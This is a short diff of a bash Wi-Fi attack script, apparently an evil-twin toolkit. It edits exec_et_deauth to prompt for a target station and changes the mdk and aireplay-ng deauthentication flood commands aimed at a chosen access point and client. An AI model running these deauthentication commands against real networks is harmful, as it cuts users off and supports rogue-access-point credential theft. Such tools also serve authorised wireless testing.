@@ -10255,16 +10255,16 @@ function exec_et_deauth() {
 	debug_print
 
 	prepare_et_monitor
-	read -p "Enter the channel: " user_channel
+	read -p "Enter the Target Station: " user_station
  
 	case ${et_dos_attack} in
 		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
-			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -S ${user_station} -c ${channel}"
 		;;
 		"Aireplay")
-			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} -c ${user_channel} --ignore-negative-one ${iface_monitor_et_deauth}"
+			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
